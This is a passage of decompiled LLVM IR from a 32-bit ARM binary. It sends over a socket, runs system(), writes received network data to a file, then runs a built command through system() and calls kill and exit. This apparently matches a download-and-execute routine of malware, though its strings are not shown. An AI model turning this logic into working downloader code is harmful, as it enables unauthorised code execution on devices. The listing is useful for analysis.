dec_label_pc_1000f490:                            ; preds = %dec_label_pc_1000f434, %dec_label_pc_1000f474
  %storemerge12 = phi i32 [ %v1_1000f488, %dec_label_pc_1000f474 ], [ %v2_1000f47c, %dec_label_pc_1000f434 ]
  %v2_1000f498 = load i32, i32* %v1_1000f23c, align 4
  %v6_1000f4b4 = call i32 @Send(i32 %v3_1000f1e0, i32 ptrtoint ([276 x i8]* @global_var_1002a17c.48 to i32), i32 %storemerge12, i32 %v2_1000f498)
  %v6_1000f4cc = call i32 @Send(i32 %arg1, i32 ptrtoint ([30 x i8]* @global_var_1002c04c.725 to i32), i32 %arg2, i32 ptrtoint ([13 x i8]* @global_var_10030000.14 to i32))
  store i32 268498140, i32* @lr, align 4
  %v2_1000f4d8 = call i32 @system(i32 ptrtoint ([11 x i8]* @global_var_1002c06c.726 to i32))
  br i1 %v3_1000f458, label %dec_label_pc_1000f7ec, label %dec_label_pc_1000f4ec

dec_label_pc_1000f4ec:                            ; preds = %dec_label_pc_1000f490
  store i32 268498176, i32* @lr, align 4
  %v4_1000f4fc = call i32 @__GI_fopen(i32 ptrtoint ([8 x i8]* @global_var_1002c078.727 to i32), i32 ptrtoint ([3 x i8]* @global_var_1002a2ac.50 to i32))
  %v2_1000f508 = ptrtoint i32* %stack_var_-4136 to i32
  %v2_1000f544 = ptrtoint i32* %stack_var_-5256 to i32
  br label %dec_label_pc_1000f508

dec_label_pc_1000f508:                            ; preds = %dec_label_pc_1000f664, %dec_label_pc_1000f4ec
  store i32 268498208, i32* @lr, align 4
  %v4_1000f51c = call i32 @recv(i32 %v3_1000f1e0, i32 %v2_1000f508, i32 4096, i32 0)
  %tmp95 = icmp slt i32 %v4_1000f51c, 1
  br i1 %tmp95, label %dec_label_pc_1000f684.preheader, label %dec_label_pc_1000f534

dec_label_pc_1000f534:                            ; preds = %dec_label_pc_1000f508
  %v2_1000f538 = icmp sgt i32 %v4_1000f51c, 4095
  br i1 %v2_1000f538, label %dec_label_pc_1000f560.lr.ph, label %dec_label_pc_1000f540

dec_label_pc_1000f540:                            ; preds = %dec_label_pc_1000f534
  %v2_1000f548 = add i32 %v4_1000f51c, %v2_1000f544
  %v3_1000f550 = add i32 %v2_1000f548, 1120
  %v4_1000f550 = inttoptr i32 %v3_1000f550 to i8*
  store i8 0, i8* %v4_1000f550, align 1
  br label %dec_label_pc_1000f560.lr.ph

dec_label_pc_1000f560.lr.ph:                      ; preds = %dec_label_pc_1000f540, %dec_label_pc_1000f534
  br label %dec_label_pc_1000f560

dec_label_pc_1000f560:                            ; preds = %dec_label_pc_1000f560.lr.ph, %dec_label_pc_1000f664
  %storemerge1353 = phi i32 [ 0, %dec_label_pc_1000f560.lr.ph ], [ %v1_1000f668, %dec_label_pc_1000f664 ]
  %v2_1000f56c = add i32 %storemerge1353, %v2_1000f508
  store i32 ptrtoint ([5 x i8]* @global_var_1002a2b0.51 to i32), i32* @r4, align 4
  %v4_1000f580 = inttoptr i32 %v2_1000f56c to i8*
  %v5_1000f580 = call i32 @__GI_strncmp(i8* %v4_1000f580, i32 ptrtoint ([5 x i8]* @global_var_1002a2b0.51 to i32), i32 4)
  %v3_1000f588 = icmp eq i32 %v5_1000f580, 0
  br i1 %v3_1000f588, label %dec_label_pc_1000f590, label %dec_label_pc_1000f664

dec_label_pc_1000f590:                            ; preds = %dec_label_pc_1000f560
  %v1_1000f594 = add i32 %storemerge1353, 4
  %v2_1000f65846 = icmp slt i32 %v1_1000f594, %v4_1000f51c
  br i1 %v2_1000f65846, label %dec_label_pc_1000f5a0.lr.ph, label %dec_label_pc_1000f684.preheader

dec_label_pc_1000f5a0.lr.ph:                      ; preds = %dec_label_pc_1000f590
  %v1_1000f5ac = add i32 %v4_1000f4fc, 52
  %v2_1000f5ac = inttoptr i32 %v1_1000f5ac to i32*
  %v1_1000f5bc = add i32 %v4_1000f4fc, 16
  %v2_1000f5bc = inttoptr i32 %v1_1000f5bc to i32*
  %v1_1000f5c4 = add i32 %v4_1000f4fc, 28
  %v2_1000f5c4 = inttoptr i32 %v1_1000f5c4 to i32*
  br label %dec_label_pc_1000f5a0

dec_label_pc_1000f5a0:                            ; preds = %dec_label_pc_1000f5a0.lr.ph, %dec_label_pc_1000f644
  %storemerge1449 = phi i32 [ %v1_1000f594, %dec_label_pc_1000f5a0.lr.ph ], [ %v1_1000f648, %dec_label_pc_1000f644 ]
  %v3_1000f5ac = load i32, i32* %v2_1000f5ac, align 4
  %v3_1000f5b0 = icmp eq i32 %v3_1000f5ac, 0
  br i1 %v3_1000f5b0, label %dec_label_pc_1000f624, label %dec_label_pc_1000f5b8

dec_label_pc_1000f5b8:                            ; preds = %dec_label_pc_1000f5a0
  %v3_1000f5bc = load i32, i32* %v2_1000f5bc, align 4
  store i32 %v3_1000f5bc, i32* %r11.global-to-local, align 4
  %v3_1000f5c4 = load i32, i32* %v2_1000f5c4, align 4
  %v2_1000f5c8 = icmp ult i32 %v3_1000f5bc, %v3_1000f5c4
  br i1 %v2_1000f5c8, label %dec_label_pc_1000f5d0, label %dec_label_pc_1000f600

dec_label_pc_1000f5d0:                            ; preds = %dec_label_pc_1000f5b8
  %v3_1000f5d4 = load i32, i32* %v2_1000f5bc, align 4
  store i32 %v3_1000f5d4, i32* %r11.global-to-local, align 4
  %v2_1000f5e0 = add i32 %storemerge1449, %v2_1000f544
  %v1_1000f5e4 = add i32 %v2_1000f5e0, 1120
  %v2_1000f5e4 = inttoptr i32 %v1_1000f5e4 to i8*
  %v3_1000f5e4 = load i8, i8* %v2_1000f5e4, align 1
  %v3_1000f5ec = inttoptr i32 %v3_1000f5d4 to i8*
  store i8 %v3_1000f5e4, i8* %v3_1000f5ec, align 1
  %v0_1000f5f0 = load i32, i32* %r11.global-to-local, align 4
  %v1_1000f5f0 = add i32 %v0_1000f5f0, 1
  store i32 %v1_1000f5f0, i32* %v2_1000f5bc, align 4
  br label %dec_label_pc_1000f644

dec_label_pc_1000f600:                            ; preds = %dec_label_pc_1000f5b8
  %v2_1000f608 = add i32 %storemerge1449, %v2_1000f544
  %v1_1000f60c = add i32 %v2_1000f608, 1120
  %v2_1000f60c = inttoptr i32 %v1_1000f60c to i8*
  %v3_1000f60c = load i8, i8* %v2_1000f60c, align 1
  store i32 ptrtoint (i32* @global_var_1000f620.728 to i32), i32* @lr, align 4
  %v4_1000f61c = call i32 @putc_unlocked(i8 %v3_1000f60c, i32 %v4_1000f4fc, i32 %v2_1000f608)
  br label %dec_label_pc_1000f644

dec_label_pc_1000f624:                            ; preds = %dec_label_pc_1000f5a0
  %v2_1000f62c = add i32 %storemerge1449, %v2_1000f544
  %v1_1000f630 = add i32 %v2_1000f62c, 1120
  %v2_1000f630 = inttoptr i32 %v1_1000f630 to i8*
  %v3_1000f630 = load i8, i8* %v2_1000f630, align 1
  store i32 268498500, i32* @lr, align 4
  %v4_1000f640 = call i32 @__GI_fputc(i8 %v3_1000f630, i32 %v4_1000f4fc, i32 %v2_1000f62c)
  br label %dec_label_pc_1000f644

dec_label_pc_1000f644:                            ; preds = %dec_label_pc_1000f600, %dec_label_pc_1000f5d0, %dec_label_pc_1000f624
  %v1_1000f648 = add i32 %storemerge1449, 1
  %v2_1000f658 = icmp slt i32 %v1_1000f648, %v4_1000f51c
  br i1 %v2_1000f658, label %dec_label_pc_1000f5a0, label %dec_label_pc_1000f684.preheader

dec_label_pc_1000f684.preheader:                  ; preds = %dec_label_pc_1000f508, %dec_label_pc_1000f644, %dec_label_pc_1000f590
  %v1_1000f6e8 = add i32 %v4_1000f4fc, 52
  %v2_1000f6e8 = inttoptr i32 %v1_1000f6e8 to i32*
  %v1_1000f6f8 = add i32 %v4_1000f4fc, 16
  %v2_1000f6f8 = inttoptr i32 %v1_1000f6f8 to i32*
  %v1_1000f700 = add i32 %v4_1000f4fc, 28
  %v2_1000f700 = inttoptr i32 %v1_1000f700 to i32*
  br label %dec_label_pc_1000f684

dec_label_pc_1000f664:                            ; preds = %dec_label_pc_1000f560
  %v1_1000f668 = add nuw nsw i32 %storemerge1353, 1
  %v2_1000f678 = icmp slt i32 %v1_1000f668, %v4_1000f51c
  br i1 %v2_1000f678, label %dec_label_pc_1000f560, label %dec_label_pc_1000f508

dec_label_pc_1000f684:                            ; preds = %dec_label_pc_1000f780, %dec_label_pc_1000f684.preheader
  store i32 268498588, i32* @lr, align 4
  %v4_1000f698 = call i32 @recv(i32 %v3_1000f1e0, i32 %v2_1000f508, i32 4096, i32 0)
  %tmp96 = icmp slt i32 %v4_1000f698, 1
  br i1 %tmp96, label %dec_label_pc_1000f7a0, label %dec_label_pc_1000f6b0

dec_label_pc_1000f6b0:                            ; preds = %dec_label_pc_1000f684
  %v2_1000f6b4 = icmp sgt i32 %v4_1000f698, 4095
  br i1 %v2_1000f6b4, label %dec_label_pc_1000f6dc.lr.ph, label %dec_label_pc_1000f6bc

dec_label_pc_1000f6bc:                            ; preds = %dec_label_pc_1000f6b0
  %v2_1000f6c4 = add i32 %v4_1000f698, %v2_1000f544
  %v3_1000f6cc = add i32 %v2_1000f6c4, 1120
  %v4_1000f6cc = inttoptr i32 %v3_1000f6cc to i8*
  store i8 0, i8* %v4_1000f6cc, align 1
  br label %dec_label_pc_1000f6dc.lr.ph

dec_label_pc_1000f6dc.lr.ph:                      ; preds = %dec_label_pc_1000f6bc, %dec_label_pc_1000f6b0
  br label %dec_label_pc_1000f6dc

dec_label_pc_1000f6dc:                            ; preds = %dec_label_pc_1000f6dc.lr.ph, %dec_label_pc_1000f780
  %storemerge1545 = phi i32 [ 0, %dec_label_pc_1000f6dc.lr.ph ], [ %v1_1000f784, %dec_label_pc_1000f780 ]
  %v3_1000f6e8 = load i32, i32* %v2_1000f6e8, align 4
  %v3_1000f6ec = icmp eq i32 %v3_1000f6e8, 0
  br i1 %v3_1000f6ec, label %dec_label_pc_1000f760, label %dec_label_pc_1000f6f4

dec_label_pc_1000f6f4:                            ; preds = %dec_label_pc_1000f6dc
  %v3_1000f6f8 = load i32, i32* %v2_1000f6f8, align 4
  store i32 %v3_1000f6f8, i32* %r11.global-to-local, align 4
  %v3_1000f700 = load i32, i32* %v2_1000f700, align 4
  %v2_1000f704 = icmp ult i32 %v3_1000f6f8, %v3_1000f700
  br i1 %v2_1000f704, label %dec_label_pc_1000f70c, label %dec_label_pc_1000f73c

dec_label_pc_1000f70c:                            ; preds = %dec_label_pc_1000f6f4
  %v3_1000f710 = load i32, i32* %v2_1000f6f8, align 4
  store i32 %v3_1000f710, i32* %r11.global-to-local, align 4
  %v2_1000f71c = add i32 %storemerge1545, %v2_1000f544
  %v1_1000f720 = add i32 %v2_1000f71c, 1120
  %v2_1000f720 = inttoptr i32 %v1_1000f720 to i8*
  %v3_1000f720 = load i8, i8* %v2_1000f720, align 1
  %v3_1000f728 = inttoptr i32 %v3_1000f710 to i8*
  store i8 %v3_1000f720, i8* %v3_1000f728, align 1
  %v0_1000f72c = load i32, i32* %r11.global-to-local, align 4
  %v1_1000f72c = add i32 %v0_1000f72c, 1
  store i32 %v1_1000f72c, i32* %v2_1000f6f8, align 4
  br label %dec_label_pc_1000f780

dec_label_pc_1000f73c:                            ; preds = %dec_label_pc_1000f6f4
  %v2_1000f744 = add i32 %storemerge1545, %v2_1000f544
  %v1_1000f748 = add i32 %v2_1000f744, 1120
  %v2_1000f748 = inttoptr i32 %v1_1000f748 to i8*
  %v3_1000f748 = load i8, i8* %v2_1000f748, align 1
  store i32 ptrtoint (i32* @global_var_1000f75c.729 to i32), i32* @lr, align 4
  %v4_1000f758 = call i32 @putc_unlocked(i8 %v3_1000f748, i32 %v4_1000f4fc, i32 %v2_1000f744)
  br label %dec_label_pc_1000f780

dec_label_pc_1000f760:                            ; preds = %dec_label_pc_1000f6dc
  %v2_1000f768 = add i32 %storemerge1545, %v2_1000f544
  %v1_1000f76c = add i32 %v2_1000f768, 1120
  %v2_1000f76c = inttoptr i32 %v1_1000f76c to i8*
  %v3_1000f76c = load i8, i8* %v2_1000f76c, align 1
  store i32 268498816, i32* @lr, align 4
  %v4_1000f77c = call i32 @__GI_fputc(i8 %v3_1000f76c, i32 %v4_1000f4fc, i32 %v2_1000f768)
  br label %dec_label_pc_1000f780

dec_label_pc_1000f780:                            ; preds = %dec_label_pc_1000f73c, %dec_label_pc_1000f70c, %dec_label_pc_1000f760
  %v1_1000f784 = add nuw nsw i32 %storemerge1545, 1
  %v2_1000f794 = icmp slt i32 %v1_1000f784, %v4_1000f698
  br i1 %v2_1000f794, label %dec_label_pc_1000f6dc, label %dec_label_pc_1000f684

dec_label_pc_1000f7a0:                            ; preds = %dec_label_pc_1000f684
  store i32 268498856, i32* @lr, align 4
  %v1_1000f7a4 = inttoptr i32 %v4_1000f4fc to i16*
  %v2_1000f7a4 = call i32 @__GI_fclose(i16* %v1_1000f7a4)
  %v2_1000f7a8 = ptrtoint i32* %stack_var_-5160 to i32
  store i32 %v2_1000f7a8, i32* @r3, align 4
  store i32 0, i32* @r4, align 4
  store i32 4096, i32* @r5, align 4
  store i32 268498876, i32* @lr, align 4
  %v0_1000f7b8 = call i32 @__GI_memset()
  store i32 %v2_1000f7a8, i32* @r3, align 4
  store i32 ptrtoint (i32* @global_var_1000f7e8.732 to i32), i32* @lr, align 4
  %v1_1000f7e4 = call i32 @sprintf(i32 %v2_1000f7a8)
  br label %dec_label_pc_1000fae0

dec_label_pc_1000f7ec:                            ; preds = %dec_label_pc_1000f490
  store i32 268498944, i32* @lr, align 4
  %v4_1000f7fc = call i32 @__GI_fopen(i32 ptrtoint ([8 x i8]* @global_var_1002c0c8.733 to i32), i32 ptrtoint ([3 x i8]* @global_var_1002a2ac.50 to i32))
  %v2_1000f808 = ptrtoint i32* %stack_var_-4136 to i32
  %v2_1000f844 = ptrtoint i32* %stack_var_-5256 to i32
  br label %dec_label_pc_1000f808

dec_label_pc_1000f808:                            ; preds = %dec_label_pc_1000f964, %dec_label_pc_1000f7ec
  store i32 268498976, i32* @lr, align 4
  %v4_1000f81c = call i32 @recv(i32 %v3_1000f1e0, i32 %v2_1000f808, i32 4096, i32 0)
  %tmp97 = icmp slt i32 %v4_1000f81c, 1
  br i1 %tmp97, label %dec_label_pc_1000f984.preheader, label %dec_label_pc_1000f834

dec_label_pc_1000f834:                            ; preds = %dec_label_pc_1000f808
  %v2_1000f838 = icmp sgt i32 %v4_1000f81c, 4095
  br i1 %v2_1000f838, label %dec_label_pc_1000f860.lr.ph, label %dec_label_pc_1000f840

dec_label_pc_1000f840:                            ; preds = %dec_label_pc_1000f834
  %v2_1000f848 = add i32 %v4_1000f81c, %v2_1000f844
  %v3_1000f850 = add i32 %v2_1000f848, 1120
  %v4_1000f850 = inttoptr i32 %v3_1000f850 to i8*
  store i8 0, i8* %v4_1000f850, align 1
  br label %dec_label_pc_1000f860.lr.ph

dec_label_pc_1000f860.lr.ph:                      ; preds = %dec_label_pc_1000f840, %dec_label_pc_1000f834
  br label %dec_label_pc_1000f860

dec_label_pc_1000f860:                            ; preds = %dec_label_pc_1000f860.lr.ph, %dec_label_pc_1000f964
  %storemerge1641 = phi i32 [ 0, %dec_label_pc_1000f860.lr.ph ], [ %v1_1000f968, %dec_label_pc_1000f964 ]
  %v2_1000f86c = add i32 %storemerge1641, %v2_1000f808
  store i32 ptrtoint ([5 x i8]* @global_var_1002a2b0.51 to i32), i32* @r4, align 4
  %v4_1000f880 = inttoptr i32 %v2_1000f86c to i8*
  %v5_1000f880 = call i32 @__GI_strncmp(i8* %v4_1000f880, i32 ptrtoint ([5 x i8]* @global_var_1002a2b0.51 to i32), i32 4)
  %v3_1000f888 = icmp eq i32 %v5_1000f880, 0
  br i1 %v3_1000f888, label %dec_label_pc_1000f890, label %dec_label_pc_1000f964

dec_label_pc_1000f890:                            ; preds = %dec_label_pc_1000f860
  %v1_1000f894 = add i32 %storemerge1641, 4
  %v2_1000f95834 = icmp slt i32 %v1_1000f894, %v4_1000f81c
  br i1 %v2_1000f95834, label %dec_label_pc_1000f8a0.lr.ph, label %dec_label_pc_1000f984.preheader

dec_label_pc_1000f8a0.lr.ph:                      ; preds = %dec_label_pc_1000f890
  %v1_1000f8ac = add i32 %v4_1000f7fc, 52
  %v2_1000f8ac = inttoptr i32 %v1_1000f8ac to i32*
  %v1_1000f8bc = add i32 %v4_1000f7fc, 16
  %v2_1000f8bc = inttoptr i32 %v1_1000f8bc to i32*
  %v1_1000f8c4 = add i32 %v4_1000f7fc, 28
  %v2_1000f8c4 = inttoptr i32 %v1_1000f8c4 to i32*
  br label %dec_label_pc_1000f8a0

dec_label_pc_1000f8a0:                            ; preds = %dec_label_pc_1000f8a0.lr.ph, %dec_label_pc_1000f944
  %storemerge1737 = phi i32 [ %v1_1000f894, %dec_label_pc_1000f8a0.lr.ph ], [ %v1_1000f948, %dec_label_pc_1000f944 ]
  %v3_1000f8ac = load i32, i32* %v2_1000f8ac, align 4
  %v3_1000f8b0 = icmp eq i32 %v3_1000f8ac, 0
  br i1 %v3_1000f8b0, label %dec_label_pc_1000f924, label %dec_label_pc_1000f8b8

dec_label_pc_1000f8b8:                            ; preds = %dec_label_pc_1000f8a0
  %v3_1000f8bc = load i32, i32* %v2_1000f8bc, align 4
  store i32 %v3_1000f8bc, i32* %r11.global-to-local, align 4
  %v3_1000f8c4 = load i32, i32* %v2_1000f8c4, align 4
  %v2_1000f8c8 = icmp ult i32 %v3_1000f8bc, %v3_1000f8c4
  br i1 %v2_1000f8c8, label %dec_label_pc_1000f8d0, label %dec_label_pc_1000f900

dec_label_pc_1000f8d0:                            ; preds = %dec_label_pc_1000f8b8
  %v3_1000f8d4 = load i32, i32* %v2_1000f8bc, align 4
  store i32 %v3_1000f8d4, i32* %r11.global-to-local, align 4
  %v2_1000f8e0 = add i32 %storemerge1737, %v2_1000f844
  %v1_1000f8e4 = add i32 %v2_1000f8e0, 1120
  %v2_1000f8e4 = inttoptr i32 %v1_1000f8e4 to i8*
  %v3_1000f8e4 = load i8, i8* %v2_1000f8e4, align 1
  %v3_1000f8ec = inttoptr i32 %v3_1000f8d4 to i8*
  store i8 %v3_1000f8e4, i8* %v3_1000f8ec, align 1
  %v0_1000f8f0 = load i32, i32* %r11.global-to-local, align 4
  %v1_1000f8f0 = add i32 %v0_1000f8f0, 1
  store i32 %v1_1000f8f0, i32* %v2_1000f8bc, align 4
  br label %dec_label_pc_1000f944

dec_label_pc_1000f900:                            ; preds = %dec_label_pc_1000f8b8
  %v2_1000f908 = add i32 %storemerge1737, %v2_1000f844
  %v1_1000f90c = add i32 %v2_1000f908, 1120
  %v2_1000f90c = inttoptr i32 %v1_1000f90c to i8*
  %v3_1000f90c = load i8, i8* %v2_1000f90c, align 1
  store i32 ptrtoint (i32* @global_var_1000f920.734 to i32), i32* @lr, align 4
  %v4_1000f91c = call i32 @putc_unlocked(i8 %v3_1000f90c, i32 %v4_1000f7fc, i32 %v2_1000f908)
  br label %dec_label_pc_1000f944

dec_label_pc_1000f924:                            ; preds = %dec_label_pc_1000f8a0
  %v2_1000f92c = add i32 %storemerge1737, %v2_1000f844
  %v1_1000f930 = add i32 %v2_1000f92c, 1120
  %v2_1000f930 = inttoptr i32 %v1_1000f930 to i8*
  %v3_1000f930 = load i8, i8* %v2_1000f930, align 1
  store i32 268499268, i32* @lr, align 4
  %v4_1000f940 = call i32 @__GI_fputc(i8 %v3_1000f930, i32 %v4_1000f7fc, i32 %v2_1000f92c)
  br label %dec_label_pc_1000f944

dec_label_pc_1000f944:                            ; preds = %dec_label_pc_1000f900, %dec_label_pc_1000f8d0, %dec_label_pc_1000f924
  %v1_1000f948 = add i32 %storemerge1737, 1
  %v2_1000f958 = icmp slt i32 %v1_1000f948, %v4_1000f81c
  br i1 %v2_1000f958, label %dec_label_pc_1000f8a0, label %dec_label_pc_1000f984.preheader

dec_label_pc_1000f984.preheader:                  ; preds = %dec_label_pc_1000f808, %dec_label_pc_1000f944, %dec_label_pc_1000f890
  %v1_1000f9e8 = add i32 %v4_1000f7fc, 52
  %v2_1000f9e8 = inttoptr i32 %v1_1000f9e8 to i32*
  %v1_1000f9f8 = add i32 %v4_1000f7fc, 16
  %v2_1000f9f8 = inttoptr i32 %v1_1000f9f8 to i32*
  %v1_1000fa00 = add i32 %v4_1000f7fc, 28
  %v2_1000fa00 = inttoptr i32 %v1_1000fa00 to i32*
  br label %dec_label_pc_1000f984

dec_label_pc_1000f964:                            ; preds = %dec_label_pc_1000f860
  %v1_1000f968 = add nuw nsw i32 %storemerge1641, 1
  %v2_1000f978 = icmp slt i32 %v1_1000f968, %v4_1000f81c
  br i1 %v2_1000f978, label %dec_label_pc_1000f860, label %dec_label_pc_1000f808

dec_label_pc_1000f984:                            ; preds = %dec_label_pc_1000fa80, %dec_label_pc_1000f984.preheader
  store i32 268499356, i32* @lr, align 4
  %v4_1000f998 = call i32 @recv(i32 %v3_1000f1e0, i32 %v2_1000f808, i32 4096, i32 0)
  %tmp98 = icmp slt i32 %v4_1000f998, 1
  br i1 %tmp98, label %dec_label_pc_1000faa0, label %dec_label_pc_1000f9b0

dec_label_pc_1000f9b0:                            ; preds = %dec_label_pc_1000f984
  %v2_1000f9b4 = icmp sgt i32 %v4_1000f998, 4095
  br i1 %v2_1000f9b4, label %dec_label_pc_1000f9dc.lr.ph, label %dec_label_pc_1000f9bc

dec_label_pc_1000f9bc:                            ; preds = %dec_label_pc_1000f9b0
  %v2_1000f9c4 = add i32 %v4_1000f998, %v2_1000f844
  %v3_1000f9cc = add i32 %v2_1000f9c4, 1120
  %v4_1000f9cc = inttoptr i32 %v3_1000f9cc to i8*
  store i8 0, i8* %v4_1000f9cc, align 1
  br label %dec_label_pc_1000f9dc.lr.ph

dec_label_pc_1000f9dc.lr.ph:                      ; preds = %dec_label_pc_1000f9bc, %dec_label_pc_1000f9b0
  br label %dec_label_pc_1000f9dc

dec_label_pc_1000f9dc:                            ; preds = %dec_label_pc_1000f9dc.lr.ph, %dec_label_pc_1000fa80
  %storemerge1833 = phi i32 [ 0, %dec_label_pc_1000f9dc.lr.ph ], [ %v1_1000fa84, %dec_label_pc_1000fa80 ]
  store i32 %v4_1000f7fc, i32* %stack_var_-5256, align 4
  %v3_1000f9e8 = load i32, i32* %v2_1000f9e8, align 4
  %v3_1000f9ec = icmp eq i32 %v3_1000f9e8, 0
  br i1 %v3_1000f9ec, label %dec_label_pc_1000fa60, label %dec_label_pc_1000f9f4

dec_label_pc_1000f9f4:                            ; preds = %dec_label_pc_1000f9dc
  %v3_1000f9f8 = load i32, i32* %v2_1000f9f8, align 4
  store i32 %v3_1000f9f8, i32* %r11.global-to-local, align 4
  %v3_1000fa00 = load i32, i32* %v2_1000fa00, align 4
  %v2_1000fa04 = icmp ult i32 %v3_1000f9f8, %v3_1000fa00
  br i1 %v2_1000fa04, label %dec_label_pc_1000fa0c, label %dec_label_pc_1000fa3c

dec_label_pc_1000fa0c:                            ; preds = %dec_label_pc_1000f9f4
  %v3_1000fa10 = load i32, i32* %v2_1000f9f8, align 4
  store i32 %v3_1000fa10, i32* %r11.global-to-local, align 4
  %v2_1000fa1c = add i32 %storemerge1833, %v2_1000f844
  %v1_1000fa20 = add i32 %v2_1000fa1c, 1120
  %v2_1000fa20 = inttoptr i32 %v1_1000fa20 to i8*
  %v3_1000fa20 = load i8, i8* %v2_1000fa20, align 1
  %v3_1000fa28 = inttoptr i32 %v3_1000fa10 to i8*
  store i8 %v3_1000fa20, i8* %v3_1000fa28, align 1
  %v0_1000fa2c = load i32, i32* %r11.global-to-local, align 4
  %v1_1000fa2c = add i32 %v0_1000fa2c, 1
  %v3_1000fa30 = load i32, i32* %stack_var_-5256, align 4
  %v2_1000fa34 = add i32 %v3_1000fa30, 16
  %v3_1000fa34 = inttoptr i32 %v2_1000fa34 to i32*
  store i32 %v1_1000fa2c, i32* %v3_1000fa34, align 4
  br label %dec_label_pc_1000fa80

dec_label_pc_1000fa3c:                            ; preds = %dec_label_pc_1000f9f4
  %v2_1000fa44 = add i32 %storemerge1833, %v2_1000f844
  %v1_1000fa48 = add i32 %v2_1000fa44, 1120
  %v2_1000fa48 = inttoptr i32 %v1_1000fa48 to i8*
  %v3_1000fa48 = load i8, i8* %v2_1000fa48, align 1
  store i32 ptrtoint (i32* @global_var_1000fa5c.735 to i32), i32* @lr, align 4
  %v4_1000fa58 = call i32 @putc_unlocked(i8 %v3_1000fa48, i32 %v4_1000f7fc, i32 %v2_1000fa44)
  br label %dec_label_pc_1000fa80

dec_label_pc_1000fa60:                            ; preds = %dec_label_pc_1000f9dc
  %v2_1000fa68 = add i32 %storemerge1833, %v2_1000f844
  %v1_1000fa6c = add i32 %v2_1000fa68, 1120
  %v2_1000fa6c = inttoptr i32 %v1_1000fa6c to i8*
  %v3_1000fa6c = load i8, i8* %v2_1000fa6c, align 1
  store i32 268499584, i32* @lr, align 4
  %v4_1000fa7c = call i32 @__GI_fputc(i8 %v3_1000fa6c, i32 %v4_1000f7fc, i32 %v2_1000fa68)
  br label %dec_label_pc_1000fa80

dec_label_pc_1000fa80:                            ; preds = %dec_label_pc_1000fa3c, %dec_label_pc_1000fa0c, %dec_label_pc_1000fa60
  %v1_1000fa84 = add nuw nsw i32 %storemerge1833, 1
  %v2_1000fa94 = icmp slt i32 %v1_1000fa84, %v4_1000f998
  br i1 %v2_1000fa94, label %dec_label_pc_1000f9dc, label %dec_label_pc_1000f984

dec_label_pc_1000faa0:                            ; preds = %dec_label_pc_1000f984
  store i32 268499624, i32* @lr, align 4
  %v1_1000faa4 = inttoptr i32 %v4_1000f7fc to i16*
  %v2_1000faa4 = call i32 @__GI_fclose(i16* %v1_1000faa4)
  %v2_1000faa8 = ptrtoint i32* %stack_var_-5160 to i32
  store i32 %v2_1000faa8, i32* @r3, align 4
  store i32 0, i32* @r4, align 4
  store i32 4096, i32* @r5, align 4
  store i32 268499644, i32* @lr, align 4
  %v0_1000fab8 = call i32 @__GI_memset()
  store i32 188, i32* %r11.global-to-local, align 4
  store i32 %v2_1000faa8, i32* @r3, align 4
  store i32 ptrtoint ([188 x i8]* @global_var_1002c0d0.736 to i32), i32* @r4, align 4
  store i32 188, i32* @r5, align 4
  store i32 268499680, i32* @lr, align 4
  %v0_1000fadc = call i32 @memcpy()
  br label %dec_label_pc_1000fae0

dec_label_pc_1000fae0:                            ; preds = %dec_label_pc_1000f7a0, %dec_label_pc_1000faa0
  %v2_1000faf0.pre-phi = phi i32 [ %v2_1000f7a8, %dec_label_pc_1000f7a0 ], [ %v2_1000faa8, %dec_label_pc_1000faa0 ]
  store i32 268499688, i32* @lr, align 4
  %v1_1000fae4 = call i32 @close(i32 %arg1)
  store i32 268499696, i32* @lr, align 4
  %v1_1000faec = call i32 @close(i32 %v3_1000f1e0)
  store i32 ptrtoint ([3 x i8]* @global_var_1000fafc.737 to i32), i32* @lr, align 4
  %v1_1000faf8 = call i32 @system(i32 %v2_1000faf0.pre-phi)
  store i32 ptrtoint ([3 x i8]* @global_var_1000fb08.738 to i32), i32* @lr, align 4
  %v2_1000fb04 = call i32 @kill(i32 9, i32 0)
  %v0_1000fb0c = call i32 @__GI_exit()
  br label %dec_label_pc_1000fb10

dec_label_pc_1000fb10:                            ; preds = %entry, %dec_label_pc_1000fae0
  %v0_1000fb28 = phi i32 [ %v1_1000f198, %entry ], [ %v0_1000fb0c, %dec_label_pc_1000fae0 ]
  %v2_1000fb10 = load i32, i32* %stack_var_-5264, align 4
  store i32 %v2_1000fb10, i32* %r11.global-to-local, align 4
  ret i32 %v0_1000fb28

; uselistorder directives
  uselistorder i32 %storemerge1833, { 3, 0, 1, 2 }
  uselistorder i32 %v4_1000f998, { 1, 0, 2, 3 }
  uselistorder i32 %storemerge1737, { 3, 0, 1, 2 }
  uselistorder i32 %storemerge1641, { 2, 0, 1 }
  uselistorder i32 %v4_1000f81c, { 3, 0, 1, 2, 4, 5 }
  uselistorder i32 %v2_1000f808, { 1, 0, 2 }
  uselistorder i32 %v4_1000f7fc, { 11, 0, 1, 9, 3, 2, 10, 7, 4, 6, 5, 8 }
  uselistorder i32 %storemerge1545, { 3, 0, 1, 2 }
  uselistorder i32 %v4_1000f698, { 1, 0, 2, 3 }
  uselistorder i32 %storemerge1449, { 3, 0, 1, 2 }
  uselistorder i32 %storemerge1353, { 2, 0, 1 }
  uselistorder i32 %v4_1000f51c, { 3, 0, 1, 2, 4, 5 }
  uselistorder i32 %v2_1000f508, { 1, 0, 2 }
  uselistorder i32 %v4_1000f4fc, { 10, 8, 5, 7, 6, 9, 3, 0, 2, 1, 4 }
  uselistorder i32 %v2_1000f47c, { 1, 0 }
  uselistorder i32 %storemerge11, { 1, 2, 3, 0, 4 }
  uselistorder i32 %v3_1000f1e0, { 2, 3, 4, 0, 1, 5, 6, 7 }
  uselistorder i32 %arg2, { 2, 1, 3, 4, 0, 5 }
  uselistorder i32 %arg1, { 2, 3, 1, 4, 5, 0 }
  uselistorder label %dec_label_pc_1000fb10, { 1, 0 }
  uselistorder label %dec_label_pc_1000fae0, { 1, 0 }
  uselistorder label %dec_label_pc_1000fa80, { 2, 0, 1 }
  uselistorder label %dec_label_pc_1000f9dc, { 1, 0 }
  uselistorder label %dec_label_pc_1000f984.preheader, { 1, 2, 0 }
  uselistorder label %dec_label_pc_1000f944, { 2, 0, 1 }
  uselistorder label %dec_label_pc_1000f8a0, { 1, 0 }
  uselistorder label %dec_label_pc_1000f860, { 1, 0 }
  uselistorder label %dec_label_pc_1000f780, { 2, 0, 1 }
  uselistorder label %dec_label_pc_1000f6dc, { 1, 0 }
  uselistorder label %dec_label_pc_1000f684.preheader, { 1, 2, 0 }
  uselistorder label %dec_label_pc_1000f644, { 2, 0, 1 }
